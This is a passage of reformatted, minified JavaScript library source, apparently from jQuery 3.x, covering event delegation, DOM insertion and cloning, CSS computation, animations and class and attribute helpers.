    touches: !0,
    which: function (e) {
      var t = e.button;
      return null == e.which && be.test(e.type) ? null != e.charCode ? e.charCode : e.keyCode : !e.which && void 0 !== t && we.test(e.type) ? 1 & t ? 1 : 2 & t ? 3 : 4 & t ? 2 : 0 : e.which;
    }
  }, S.event.addProp), S.each({
    mouseenter: "mouseover",
    mouseleave: "mouseout",
    pointerenter: "pointerover",
    pointerleave: "pointerout"
  }, function (e, o) {
    S.event.special[e] = {
      delegateType: o,
      bindType: o,
      handle: function (e) {
        var t,
          n = e.relatedTarget,
          i = e.handleObj;
        return n && (n === this || S.contains(this, n)) || (e.type = i.origType, t = i.handler.apply(this, arguments), e.type = o), t;
      }
    };
  }), S.fn.extend({
    on: function (e, t, n, i) {
      return Se(this, e, t, n, i);
    },
    one: function (e, t, n, i) {
      return Se(this, e, t, n, i, 1);
    },
    off: function (e, t, n) {
      var i, o;
      if (e && e.preventDefault && e.handleObj) return i = e.handleObj, S(e.delegateTarget).off(i.namespace ? i.origType + "." + i.namespace : i.origType, i.selector, i.handler), this;
      if ("object" != typeof e) return !1 !== t && "function" != typeof t || (n = t, t = void 0), !1 === n && (n = Ce), this.each(function () {
        S.event.remove(this, e, n, t);
      });
      for (o in e) this.off(o, t, e[o]);
      return this;
    }
  });
  var $e = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi,
    Te = /<script|<style|<link/i,
    Ee = /checked\s*(?:[^=]|=\s*.checked.)/i,
    De = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;
  function _e(e, t) {
    return T(e, "table") && T(11 !== t.nodeType ? t : t.firstChild, "tr") && S(e).children("tbody")[0] || e;
  }
  function Ae(e) {
    return e.type = (null !== e.getAttribute("type")) + "/" + e.type, e;
  }
  function Ie(e) {
    return "true/" === (e.type || "").slice(0, 5) ? e.type = e.type.slice(5) : e.removeAttribute("type"), e;
  }
  function Pe(e, t) {
    var n, i, o, r, a, s, l, d;
    if (1 === t.nodeType) {
      if (K.hasData(e) && (r = K.access(e), a = K.set(t, r), d = r.events)) for (o in delete a.handle, a.events = {}, d) for (n = 0, i = d[o].length; n < i; n++) S.event.add(t, o, d[o][n]);
      Q.hasData(e) && (s = Q.access(e), l = S.extend({}, s), Q.set(t, l));
    }
  }
  function He(n, i, o, r) {
    i = m.apply([], i);
    var e,
      t,
      a,
      s,
      l,
      d,
      c = 0,
      u = n.length,
      p = u - 1,
      h = i[0],
      f = b(h);
    if (f || 1 < u && "string" == typeof h && !y.checkClone && Ee.test(h)) return n.each(function (e) {
      var t = n.eq(e);
      f && (i[0] = h.call(this, e, t.html())), He(t, i, o, r);
    });
    if (u && (t = (e = ve(i, n[0].ownerDocument, !1, n, r)).firstChild, 1 === e.childNodes.length && (e = t), t || r)) {
      for (s = (a = S.map(pe(e, "script"), Ae)).length; c < u; c++) l = e, c !== p && (l = S.clone(l, !0, !0), s && S.merge(a, pe(l, "script"))), o.call(n[c], l, c);
      if (s) for (d = a[a.length - 1].ownerDocument, S.map(a, Ie), c = 0; c < s; c++) l = a[c], ce.test(l.type || "") && !K.access(l, "globalEval") && S.contains(d, l) && (l.src && "module" !== (l.type || "").toLowerCase() ? S._evalUrl && S._evalUrl(l.src) : w(l.textContent.replace(De, ""), d, l));
    }
    return n;
  }
  function Me(e, t, n) {
    for (var i, o = t ? S.filter(t, e) : e, r = 0; null != (i = o[r]); r++) n || 1 !== i.nodeType || S.cleanData(pe(i)), i.parentNode && (n && S.contains(i.ownerDocument, i) && he(pe(i, "script")), i.parentNode.removeChild(i));
    return e;
  }
  S.extend({
    htmlPrefilter: function (e) {
      return e.replace($e, "<$1></$2>");
    },
    clone: function (e, t, n) {
      var i,
        o,
        r,
        a,
        s,
        l,
        d,
        c = e.cloneNode(!0),
        u = S.contains(e.ownerDocument, e);
      if (!(y.noCloneChecked || 1 !== e.nodeType && 11 !== e.nodeType || S.isXMLDoc(e))) for (a = pe(c), i = 0, o = (r = pe(e)).length; i < o; i++) s = r[i], l = a[i], "input" === (d = l.nodeName.toLowerCase()) && le.test(s.type) ? l.checked = s.checked : "input" !== d && "textarea" !== d || (l.defaultValue = s.defaultValue);
      if (t) if (n) for (r = r || pe(e), a = a || pe(c), i = 0, o = r.length; i < o; i++) Pe(r[i], a[i]);else Pe(e, c);
      return 0 < (a = pe(c, "script")).length && he(a, !u && pe(e, "script")), c;
    },
    cleanData: function (e) {
      for (var t, n, i, o = S.event.special, r = 0; void 0 !== (n = e[r]); r++) if (X(n)) {
        if (t = n[K.expando]) {
          if (t.events) for (i in t.events) o[i] ? S.event.remove(n, i) : S.removeEvent(n, i, t.handle);
          n[K.expando] = void 0;
        }
        n[Q.expando] && (n[Q.expando] = void 0);
      }
    }
  }), S.fn.extend({
    detach: function (e) {
      return Me(this, e, !0);
    },
    remove: function (e) {
      return Me(this, e);
    },
    text: function (e) {
      return z(this, function (e) {
        return void 0 === e ? S.text(this) : this.empty().each(function () {
          1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || (this.textContent = e);
        });
      }, null, e, arguments.length);
    },
    append: function () {
      return He(this, arguments, function (e) {
        1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || _e(this, e).appendChild(e);
      });
    },
    prepend: function () {
      return He(this, arguments, function (e) {
        if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
          var t = _e(this, e);
          t.insertBefore(e, t.firstChild);
        }
      });
    },
    before: function () {
      return He(this, arguments, function (e) {
        this.parentNode && this.parentNode.insertBefore(e, this);
      });
    },
    after: function () {
      return He(this, arguments, function (e) {
        this.parentNode && this.parentNode.insertBefore(e, this.nextSibling);
      });
    },
    empty: function () {
      for (var e, t = 0; null != (e = this[t]); t++) 1 === e.nodeType && (S.cleanData(pe(e, !1)), e.textContent = "");
      return this;
    },
    clone: function (e, t) {
      return e = null != e && e, t = null == t ? e : t, this.map(function () {
        return S.clone(this, e, t);
      });
    },
    html: function (e) {
      return z(this, function (e) {
        var t = this[0] || {},
          n = 0,
          i = this.length;
        if (void 0 === e && 1 === t.nodeType) return t.innerHTML;
        if ("string" == typeof e && !Te.test(e) && !ue[(de.exec(e) || ["", ""])[1].toLowerCase()]) {
          e = S.htmlPrefilter(e);
          try {
            for (; n < i; n++) 1 === (t = this[n] || {}).nodeType && (S.cleanData(pe(t, !1)), t.innerHTML = e);
            t = 0;
          } catch (e) {}
        }
        t && this.empty().append(e);
      }, null, e, arguments.length);
    },
    replaceWith: function () {
      var n = [];
      return He(this, arguments, function (e) {
        var t = this.parentNode;
        S.inArray(this, n) < 0 && (S.cleanData(pe(this)), t && t.replaceChild(e, this));
      }, n);
    }
  }), S.each({
    appendTo: "append",
    prependTo: "prepend",
    insertBefore: "before",
    insertAfter: "after",
    replaceAll: "replaceWith"
  }, function (e, a) {
    S.fn[e] = function (e) {
      for (var t, n = [], i = S(e), o = i.length - 1, r = 0; r <= o; r++) t = r === o ? this : this.clone(!0), S(i[r])[a](t), l.apply(n, t.get());
      return this.pushStack(n);
    };
  });
  var Le,
    Ne,
    Oe,
    Re,
    Fe,
    Be,
    ze,
    qe = new RegExp("^(" + te + ")(?!px)[a-z%]+$", "i"),
    We = function (e) {
      var t = e.ownerDocument.defaultView;
      return t && t.opener || (t = C), t.getComputedStyle(e);
    },
    Ue = new RegExp(ie.join("|"), "i");
  function Ye() {
    if (ze) {
      Be.style.cssText = "position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0", ze.style.cssText = "position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%", ye.appendChild(Be).appendChild(ze);
      var e = C.getComputedStyle(ze);
      Le = "1%" !== e.top, Fe = 12 === Xe(e.marginLeft), ze.style.right = "60%", Re = 36 === Xe(e.right), Ne = 36 === Xe(e.width), ze.style.position = "absolute", Oe = 36 === ze.offsetWidth || "absolute", ye.removeChild(Be), ze = null;
    }
  }
  function Xe(e) {
    return Math.round(parseFloat(e));
  }
  function Ve(e, t, n) {
    var i,
      o,
      r,
      a,
      s = e.style;
    return (n = n || We(e)) && ("" !== (a = n.getPropertyValue(t) || n[t]) || S.contains(e.ownerDocument, e) || (a = S.style(e, t)), !y.pixelBoxStyles() && qe.test(a) && Ue.test(t) && (i = s.width, o = s.minWidth, r = s.maxWidth, s.minWidth = s.maxWidth = s.width = a, a = n.width, s.width = i, s.minWidth = o, s.maxWidth = r)), void 0 !== a ? a + "" : a;
  }
  function Ke(e, t) {
    return {
      get: function () {
        if (!e()) return (this.get = t).apply(this, arguments);
        delete this.get;
      }
    };
  }
  Be = k.createElement("div"), (ze = k.createElement("div")).style && (ze.style.backgroundClip = "content-box", ze.cloneNode(!0).style.backgroundClip = "", y.clearCloneStyle = "content-box" === ze.style.backgroundClip, S.extend(y, {
    boxSizingReliable: function () {
      return Ye(), Ne;
    },
    pixelBoxStyles: function () {
      return Ye(), Re;
    },
    pixelPosition: function () {
      return Ye(), Le;
    },
    reliableMarginLeft: function () {
      return Ye(), Fe;
    },
    scrollboxSize: function () {
      return Ye(), Oe;
    }
  }));
  var Qe = /^(none|table(?!-c[ea]).+)/,
    Ge = /^--/,
    Je = {
      position: "absolute",
      visibility: "hidden",
      display: "block"
    },
    Ze = {
      letterSpacing: "0",
      fontWeight: "400"
    },
    et = ["Webkit", "Moz", "ms"],
    tt = k.createElement("div").style;
  function nt(e) {
    var t = S.cssProps[e];
    return t = t || (S.cssProps[e] = function (e) {
      if (e in tt) return e;
      for (var t = e[0].toUpperCase() + e.slice(1), n = et.length; n--;) if ((e = et[n] + t) in tt) return e;
    }(e) || e);
  }
  function it(e, t, n) {
    var i = ne.exec(t);
    return i ? Math.max(0, i[2] - (n || 0)) + (i[3] || "px") : t;
  }
  function ot(e, t, n, i, o, r) {
    var a = "width" === t ? 1 : 0,
      s = 0,
      l = 0;
    if (n === (i ? "border" : "content")) return 0;
    for (; a < 4; a += 2) "margin" === n && (l += S.css(e, n + ie[a], !0, o)), i ? ("content" === n && (l -= S.css(e, "padding" + ie[a], !0, o)), "margin" !== n && (l -= S.css(e, "border" + ie[a] + "Width", !0, o))) : (l += S.css(e, "padding" + ie[a], !0, o), "padding" !== n ? l += S.css(e, "border" + ie[a] + "Width", !0, o) : s += S.css(e, "border" + ie[a] + "Width", !0, o));
    return !i && 0 <= r && (l += Math.max(0, Math.ceil(e["offset" + t[0].toUpperCase() + t.slice(1)] - r - l - s - .5))), l;
  }
  function rt(e, t, n) {
    var i = We(e),
      o = Ve(e, t, i),
      r = "border-box" === S.css(e, "boxSizing", !1, i),
      a = r;
    if (qe.test(o)) {
      if (!n) return o;
      o = "auto";
    }
    return a = a && (y.boxSizingReliable() || o === e.style[t]), "auto" !== o && (parseFloat(o) || "inline" !== S.css(e, "display", !1, i)) || (o = e["offset" + t[0].toUpperCase() + t.slice(1)], a = !0), (o = parseFloat(o) || 0) + ot(e, t, n || (r ? "border" : "content"), a, i, o) + "px";
  }
  function at(e, t, n, i, o) {
    return new at.prototype.init(e, t, n, i, o);
  }
  S.extend({
    cssHooks: {
      opacity: {
        get: function (e, t) {
          if (t) {
            var n = Ve(e, "opacity");
            return "" === n ? "1" : n;
          }
        }
      }
    },
    cssNumber: {
      animationIterationCount: !0,
      columnCount: !0,
      fillOpacity: !0,
      flexGrow: !0,
      flexShrink: !0,
      fontWeight: !0,
      lineHeight: !0,
      opacity: !0,
      order: !0,
      orphans: !0,
      widows: !0,
      zIndex: !0,
      zoom: !0
    },
    cssProps: {},
    style: function (e, t, n, i) {
      if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) {
        var o,
          r,
          a,
          s = Y(t),
          l = Ge.test(t),
          d = e.style;
        if (l || (t = nt(s)), a = S.cssHooks[t] || S.cssHooks[s], void 0 === n) return a && "get" in a && void 0 !== (o = a.get(e, !1, i)) ? o : d[t];
        "string" == (r = typeof n) && (o = ne.exec(n)) && o[1] && (n = re(e, t, o), r = "number"), null != n && n == n && ("number" === r && (n += o && o[3] || (S.cssNumber[s] ? "" : "px")), y.clearCloneStyle || "" !== n || 0 !== t.indexOf("background") || (d[t] = "inherit"), a && "set" in a && void 0 === (n = a.set(e, n, i)) || (l ? d.setProperty(t, n) : d[t] = n));
      }
    },
    css: function (e, t, n, i) {
      var o,
        r,
        a,
        s = Y(t);
      return Ge.test(t) || (t = nt(s)), (a = S.cssHooks[t] || S.cssHooks[s]) && "get" in a && (o = a.get(e, !0, n)), void 0 === o && (o = Ve(e, t, i)), "normal" === o && t in Ze && (o = Ze[t]), "" === n || n ? (r = parseFloat(o), !0 === n || isFinite(r) ? r || 0 : o) : o;
    }
  }), S.each(["height", "width"], function (e, s) {
    S.cssHooks[s] = {
      get: function (e, t, n) {
        if (t) return !Qe.test(S.css(e, "display")) || e.getClientRects().length && e.getBoundingClientRect().width ? rt(e, s, n) : ee(e, Je, function () {
          return rt(e, s, n);
        });
      },
      set: function (e, t, n) {
        var i,
          o = We(e),
          r = "border-box" === S.css(e, "boxSizing", !1, o),
          a = n && ot(e, s, n, r, o);
        return r && y.scrollboxSize() === o.position && (a -= Math.ceil(e["offset" + s[0].toUpperCase() + s.slice(1)] - parseFloat(o[s]) - ot(e, s, "border", !1, o) - .5)), a && (i = ne.exec(t)) && "px" !== (i[3] || "px") && (e.style[s] = t, t = S.css(e, s)), it(0, t, a);
      }
    };
  }), S.cssHooks.marginLeft = Ke(y.reliableMarginLeft, function (e, t) {
    if (t) return (parseFloat(Ve(e, "marginLeft")) || e.getBoundingClientRect().left - ee(e, {
      marginLeft: 0
    }, function () {
      return e.getBoundingClientRect().left;
    })) + "px";
  }), S.each({
    margin: "",
    padding: "",
    border: "Width"
  }, function (o, r) {
    S.cssHooks[o + r] = {
      expand: function (e) {
        for (var t = 0, n = {}, i = "string" == typeof e ? e.split(" ") : [e]; t < 4; t++) n[o + ie[t] + r] = i[t] || i[t - 2] || i[0];
        return n;
      }
    }, "margin" !== o && (S.cssHooks[o + r].set = it);
  }), S.fn.extend({
    css: function (e, t) {
      return z(this, function (e, t, n) {
        var i,
          o,
          r = {},
          a = 0;
        if (Array.isArray(t)) {
          for (i = We(e), o = t.length; a < o; a++) r[t[a]] = S.css(e, t[a], !1, i);
          return r;
        }
        return void 0 !== n ? S.style(e, t, n) : S.css(e, t);
      }, e, t, 1 < arguments.length);
    }
  }), ((S.Tween = at).prototype = {
    constructor: at,
    init: function (e, t, n, i, o, r) {
      this.elem = e, this.prop = n, this.easing = o || S.easing._default, this.options = t, this.start = this.now = this.cur(), this.end = i, this.unit = r || (S.cssNumber[n] ? "" : "px");
    },
    cur: function () {
      var e = at.propHooks[this.prop];
      return e && e.get ? e.get(this) : at.propHooks._default.get(this);
    },
    run: function (e) {
      var t,
        n = at.propHooks[this.prop];
      return this.options.duration ? this.pos = t = S.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration) : this.pos = t = e, this.now = (this.end - this.start) * t + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), n && n.set ? n.set(this) : at.propHooks._default.set(this), this;
    }
  }).init.prototype = at.prototype, (at.propHooks = {
    _default: {
      get: function (e) {
        var t;
        return 1 !== e.elem.nodeType || null != e.elem[e.prop] && null == e.elem.style[e.prop] ? e.elem[e.prop] : (t = S.css(e.elem, e.prop, "")) && "auto" !== t ? t : 0;
      },
      set: function (e) {
        S.fx.step[e.prop] ? S.fx.step[e.prop](e) : 1 !== e.elem.nodeType || null == e.elem.style[S.cssProps[e.prop]] && !S.cssHooks[e.prop] ? e.elem[e.prop] = e.now : S.style(e.elem, e.prop, e.now + e.unit);
      }
    }
  }).scrollTop = at.propHooks.scrollLeft = {
    set: function (e) {
      e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now);
    }
  }, S.easing = {
    linear: function (e) {
      return e;
    },
    swing: function (e) {
      return .5 - Math.cos(e * Math.PI) / 2;
    },
    _default: "swing"
  }, S.fx = at.prototype.init, S.fx.step = {};
  var st,
    lt,
    dt,
    ct,
    ut = /^(?:toggle|show|hide)$/,
    pt = /queueHooks$/;
  function ht() {
    lt && (!1 === k.hidden && C.requestAnimationFrame ? C.requestAnimationFrame(ht) : C.setTimeout(ht, S.fx.interval), S.fx.tick());
  }
  function ft() {
    return C.setTimeout(function () {
      st = void 0;
    }), st = Date.now();
  }
  function gt(e, t) {
    var n,
      i = 0,
      o = {
        height: e
      };
    for (t = t ? 1 : 0; i < 4; i += 2 - t) o["margin" + (n = ie[i])] = o["padding" + n] = e;
    return t && (o.opacity = o.width = e), o;
  }
  function mt(e, t, n) {
    for (var i, o = (vt.tweeners[t] || []).concat(vt.tweeners["*"]), r = 0, a = o.length; r < a; r++) if (i = o[r].call(n, t, e)) return i;
  }
  function vt(r, e, t) {
    var n,
      a,
      i = 0,
      o = vt.prefilters.length,
      s = S.Deferred().always(function () {
        delete l.elem;
      }),
      l = function () {
        if (a) return !1;
        for (var e = st || ft(), t = Math.max(0, d.startTime + d.duration - e), n = 1 - (t / d.duration || 0), i = 0, o = d.tweens.length; i < o; i++) d.tweens[i].run(n);
        return s.notifyWith(r, [d, n, t]), n < 1 && o ? t : (o || s.notifyWith(r, [d, 1, 0]), s.resolveWith(r, [d]), !1);
      },
      d = s.promise({
        elem: r,
        props: S.extend({}, e),
        opts: S.extend(!0, {
          specialEasing: {},
          easing: S.easing._default
        }, t),
        originalProperties: e,
        originalOptions: t,
        startTime: st || ft(),
        duration: t.duration,
        tweens: [],
        createTween: function (e, t) {
          var n = S.Tween(r, d.opts, e, t, d.opts.specialEasing[e] || d.opts.easing);
          return d.tweens.push(n), n;
        },
        stop: function (e) {
          var t = 0,
            n = e ? d.tweens.length : 0;
          if (a) return this;
          for (a = !0; t < n; t++) d.tweens[t].run(1);
          return e ? (s.notifyWith(r, [d, 1, 0]), s.resolveWith(r, [d, e])) : s.rejectWith(r, [d, e]), this;
        }
      }),
      c = d.props;
    for (function (e, t) {
      var n, i, o, r, a;
      for (n in e) if (o = t[i = Y(n)], r = e[n], Array.isArray(r) && (o = r[1], r = e[n] = r[0]), n !== i && (e[i] = r, delete e[n]), (a = S.cssHooks[i]) && "expand" in a) for (n in r = a.expand(r), delete e[i], r) n in e || (e[n] = r[n], t[n] = o);else t[i] = o;
    }(c, d.opts.specialEasing); i < o; i++) if (n = vt.prefilters[i].call(d, r, c, d.opts)) return b(n.stop) && (S._queueHooks(d.elem, d.opts.queue).stop = n.stop.bind(n)), n;
    return S.map(c, mt, d), b(d.opts.start) && d.opts.start.call(r, d), d.progress(d.opts.progress).done(d.opts.done, d.opts.complete).fail(d.opts.fail).always(d.opts.always), S.fx.timer(S.extend(l, {
      elem: r,
      anim: d,
      queue: d.opts.queue
    })), d;
  }
  S.Animation = S.extend(vt, {
    tweeners: {
      "*": [function (e, t) {
        var n = this.createTween(e, t);
        return re(n.elem, e, ne.exec(t), n), n;
      }]
    },
    tweener: function (e, t) {
      for (var n, i = 0, o = (e = b(e) ? (t = e, ["*"]) : e.match(M)).length; i < o; i++) n = e[i], vt.tweeners[n] = vt.tweeners[n] || [], vt.tweeners[n].unshift(t);
    },
    prefilters: [function (e, t, n) {
      var i,
        o,
        r,
        a,
        s,
        l,
        d,
        c,
        u = "width" in t || "height" in t,
        p = this,
        h = {},
        f = e.style,
        g = e.nodeType && oe(e),
        m = K.get(e, "fxshow");
      for (i in n.queue || (null == (a = S._queueHooks(e, "fx")).unqueued && (a.unqueued = 0, s = a.empty.fire, a.empty.fire = function () {
        a.unqueued || s();
      }), a.unqueued++, p.always(function () {
        p.always(function () {
          a.unqueued--, S.queue(e, "fx").length || a.empty.fire();
        });
      })), t) if (o = t[i], ut.test(o)) {
        if (delete t[i], r = r || "toggle" === o, o === (g ? "hide" : "show")) {
          if ("show" !== o || !m || void 0 === m[i]) continue;
          g = !0;
        }
        h[i] = m && m[i] || S.style(e, i);
      }
      if ((l = !S.isEmptyObject(t)) || !S.isEmptyObject(h)) for (i in u && 1 === e.nodeType && (n.overflow = [f.overflow, f.overflowX, f.overflowY], null == (d = m && m.display) && (d = K.get(e, "display")), "none" === (c = S.css(e, "display")) && (d ? c = d : (se([e], !0), d = e.style.display || d, c = S.css(e, "display"), se([e]))), ("inline" === c || "inline-block" === c && null != d) && "none" === S.css(e, "float") && (l || (p.done(function () {
        f.display = d;
      }), null == d && (c = f.display, d = "none" === c ? "" : c)), f.display = "inline-block")), n.overflow && (f.overflow = "hidden", p.always(function () {
        f.overflow = n.overflow[0], f.overflowX = n.overflow[1], f.overflowY = n.overflow[2];
      })), l = !1, h) l || (m ? "hidden" in m && (g = m.hidden) : m = K.access(e, "fxshow", {
        display: d
      }), r && (m.hidden = !g), g && se([e], !0), p.done(function () {
        for (i in g || se([e]), K.remove(e, "fxshow"), h) S.style(e, i, h[i]);
      })), l = mt(g ? m[i] : 0, i, p), i in m || (m[i] = l.start, g && (l.end = l.start, l.start = 0));
    }],
    prefilter: function (e, t) {
      t ? vt.prefilters.unshift(e) : vt.prefilters.push(e);
    }
  }), S.speed = function (e, t, n) {
    var i = e && "object" == typeof e ? S.extend({}, e) : {
      complete: n || !n && t || b(e) && e,
      duration: e,
      easing: n && t || t && !b(t) && t
    };
    return S.fx.off ? i.duration = 0 : "number" != typeof i.duration && (i.duration in S.fx.speeds ? i.duration = S.fx.speeds[i.duration] : i.duration = S.fx.speeds._default), null != i.queue && !0 !== i.queue || (i.queue = "fx"), i.old = i.complete, i.complete = function () {
      b(i.old) && i.old.call(this), i.queue && S.dequeue(this, i.queue);
    }, i;
  }, S.fn.extend({
    fadeTo: function (e, t, n, i) {
      return this.filter(oe).css("opacity", 0).show().end().animate({
        opacity: t
      }, e, n, i);
    },
    animate: function (t, e, n, i) {
      function o() {
        var e = vt(this, S.extend({}, t), a);
        (r || K.get(this, "finish")) && e.stop(!0);
      }
      var r = S.isEmptyObject(t),
        a = S.speed(e, n, i);
      return o.finish = o, r || !1 === a.queue ? this.each(o) : this.queue(a.queue, o);
    },
    stop: function (o, e, r) {
      function a(e) {
        var t = e.stop;
        delete e.stop, t(r);
      }
      return "string" != typeof o && (r = e, e = o, o = void 0), e && !1 !== o && this.queue(o || "fx", []), this.each(function () {
        var e = !0,
          t = null != o && o + "queueHooks",
          n = S.timers,
          i = K.get(this);
        if (t) i[t] && i[t].stop && a(i[t]);else for (t in i) i[t] && i[t].stop && pt.test(t) && a(i[t]);
        for (t = n.length; t--;) n[t].elem !== this || null != o && n[t].queue !== o || (n[t].anim.stop(r), e = !1, n.splice(t, 1));
        !e && r || S.dequeue(this, o);
      });
    },
    finish: function (a) {
      return !1 !== a && (a = a || "fx"), this.each(function () {
        var e,
          t = K.get(this),
          n = t[a + "queue"],
          i = t[a + "queueHooks"],
          o = S.timers,
          r = n ? n.length : 0;
        for (t.finish = !0, S.queue(this, a, []), i && i.stop && i.stop.call(this, !0), e = o.length; e--;) o[e].elem === this && o[e].queue === a && (o[e].anim.stop(!0), o.splice(e, 1));
        for (e = 0; e < r; e++) n[e] && n[e].finish && n[e].finish.call(this);
        delete t.finish;
      });
    }
  }), S.each(["toggle", "show", "hide"], function (e, i) {
    var o = S.fn[i];
    S.fn[i] = function (e, t, n) {
      return null == e || "boolean" == typeof e ? o.apply(this, arguments) : this.animate(gt(i, !0), e, t, n);
    };
  }), S.each({
    slideDown: gt("show"),
    slideUp: gt("hide"),
    slideToggle: gt("toggle"),
    fadeIn: {
      opacity: "show"
    },
    fadeOut: {
      opacity: "hide"
    },
    fadeToggle: {
      opacity: "toggle"
    }
  }, function (e, i) {
    S.fn[e] = function (e, t, n) {
      return this.animate(i, e, t, n);
    };
  }), S.timers = [], S.fx.tick = function () {
    var e,
      t = 0,
      n = S.timers;
    for (st = Date.now(); t < n.length; t++) (e = n[t])() || n[t] !== e || n.splice(t--, 1);
    n.length || S.fx.stop(), st = void 0;
  }, S.fx.timer = function (e) {
    S.timers.push(e), S.fx.start();
  }, S.fx.interval = 13, S.fx.start = function () {
    lt || (lt = !0, ht());
  }, S.fx.stop = function () {
    lt = null;
  }, S.fx.speeds = {
    slow: 600,
    fast: 200,
    _default: 400
  }, S.fn.delay = function (i, e) {
    return i = S.fx && S.fx.speeds[i] || i, e = e || "fx", this.queue(e, function (e, t) {
      var n = C.setTimeout(e, i);
      t.stop = function () {
        C.clearTimeout(n);
      };
    });
  }, dt = k.createElement("input"), ct = k.createElement("select").appendChild(k.createElement("option")), dt.type = "checkbox", y.checkOn = "" !== dt.value, y.optSelected = ct.selected, (dt = k.createElement("input")).value = "t", dt.type = "radio", y.radioValue = "t" === dt.value;
  var yt,
    bt = S.expr.attrHandle;
  S.fn.extend({
    attr: function (e, t) {
      return z(this, S.attr, e, t, 1 < arguments.length);
    },
    removeAttr: function (e) {
      return this.each(function () {
        S.removeAttr(this, e);
      });
    }
  }), S.extend({
    attr: function (e, t, n) {
      var i,
        o,
        r = e.nodeType;
      if (3 !== r && 8 !== r && 2 !== r) return void 0 === e.getAttribute ? S.prop(e, t, n) : (1 === r && S.isXMLDoc(e) || (o = S.attrHooks[t.toLowerCase()] || (S.expr.match.bool.test(t) ? yt : void 0)), void 0 !== n ? null === n ? void S.removeAttr(e, t) : o && "set" in o && void 0 !== (i = o.set(e, n, t)) ? i : (e.setAttribute(t, n + ""), n) : o && "get" in o && null !== (i = o.get(e, t)) ? i : null == (i = S.find.attr(e, t)) ? void 0 : i);
    },
    attrHooks: {
      type: {
        set: function (e, t) {
          if (!y.radioValue && "radio" === t && T(e, "input")) {
            var n = e.value;
            return e.setAttribute("type", t), n && (e.value = n), t;
          }
        }
      }
    },
    removeAttr: function (e, t) {
      var n,
        i = 0,
        o = t && t.match(M);
      if (o && 1 === e.nodeType) for (; n = o[i++];) e.removeAttribute(n);
    }
  }), yt = {
    set: function (e, t, n) {
      return !1 === t ? S.removeAttr(e, n) : e.setAttribute(n, n), n;
    }
  }, S.each(S.expr.match.bool.source.match(/\w+/g), function (e, t) {
    var a = bt[t] || S.find.attr;
    bt[t] = function (e, t, n) {
      var i,
        o,
        r = t.toLowerCase();
      return n || (o = bt[r], bt[r] = i, i = null != a(e, t, n) ? r : null, bt[r] = o), i;
    };
  });
  var wt = /^(?:input|select|textarea|button)$/i,
    xt = /^(?:a|area)$/i;
  function jt(e) {
    return (e.match(M) || []).join(" ");
  }
  function Ct(e) {
    return e.getAttribute && e.getAttribute("class") || "";
  }
  function kt(e) {
    return Array.isArray(e) ? e : "string" == typeof e && e.match(M) || [];
  }
  S.fn.extend({
    prop: function (e, t) {
      return z(this, S.prop, e, t, 1 < arguments.length);
    },
    removeProp: function (e) {
      return this.each(function () {
        delete this[S.propFix[e] || e];
      });
    }
  }), S.extend({
    prop: function (e, t, n) {
      var i,
        o,
        r = e.nodeType;
      if (3 !== r && 8 !== r && 2 !== r) return 1 === r && S.isXMLDoc(e) || (t = S.propFix[t] || t, o = S.propHooks[t]), void 0 !== n ? o && "set" in o && void 0 !== (i = o.set(e, n, t)) ? i : e[t] = n : o && "get" in o && null !== (i = o.get(e, t)) ? i : e[t];
    },
    propHooks: {
      tabIndex: {
        get: function (e) {
          var t = S.find.attr(e, "tabindex");
          return t ? parseInt(t, 10) : wt.test(e.nodeName) || xt.test(e.nodeName) && e.href ? 0 : -1;
        }
      }
    },
    propFix: {
      for: "htmlFor",
      class: "className"
    }
  }), y.optSelected || (S.propHooks.selected = {
    get: function (e) {
      var t = e.parentNode;
      return t && t.parentNode && t.parentNode.selectedIndex, null;
    },
    set: function (e) {
      var t = e.parentNode;
      t && (t.selectedIndex, t.parentNode && t.parentNode.selectedIndex);
    }
  }), S.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function () {
    S.propFix[this.toLowerCase()] = this;
  }), S.fn.extend({
    addClass: function (t) {
      var e,
        n,
        i,
        o,
        r,
        a,
        s,
        l = 0;
      if (b(t)) return this.each(function (e) {
        S(this).addClass(t.call(this, e, Ct(this)));
      });
      if ((e = kt(t)).length) for (; n = this[l++];) if (o = Ct(n), i = 1 === n.nodeType && " " + jt(o) + " ") {
        for (a = 0; r = e[a++];) i.indexOf(" " + r + " ") < 0 && (i += r + " ");
        o !== (s = jt(i)) && n.setAttribute("class", s);
      }
      return this;
    },
    removeClass: function (t) {
      var e,
        n,
        i,
        o,
        r,
        a,
        s,
        l = 0;
      if (b(t)) return this.each(function (e) {
        S(this).removeClass(t.call(this, e, Ct(this)));
      });
      if (!arguments.length) return this.attr("class", "");
      if ((e = kt(t)).length) for (; n = this[l++];) if (o = Ct(n), i = 1 === n.nodeType && " " + jt(o) + " ") {
        for (a = 0; r = e[a++];) for (; -1 < i.indexOf(" " + r + " ");) i = i.replace(" " + r + " ", " ");
        o !== (s = jt(i)) && n.setAttribute("class", s);
      }
      return this;
    },
    toggleClass: function (o, t) {
      var r = typeof o,
        a = "string" == r || Array.isArray(o);
      return "boolean" == typeof t && a ? t ? this.addClass(o) : this.removeClass(o) : b(o) ? this.each(function (e) {
        S(this).toggleClass(o.call(this, e, Ct(this), t), t);
      }) : this.each(function () {
        var e, t, n, i;
        if (a) for (t = 0, n = S(this), i = kt(o); e = i[t++];) n.hasClass(e) ? n.removeClass(e) : n.addClass(e);else void 0 !== o && "boolean" != r || ((e = Ct(this)) && K.set(this, "__className__", e), this.setAttribute && this.setAttribute("class", e || !1 === o ? "" : K.get(this, "__className__") || ""));
      });
    },
    hasClass: function (e) {
      var t,
        n,
        i = 0;
      for (t = " " + e + " "; n = this[i++];) if (1 === n.nodeType && -1 < (" " + jt(Ct(n)) + " ").indexOf(t)) return !0;
      return !1;
    }
  });
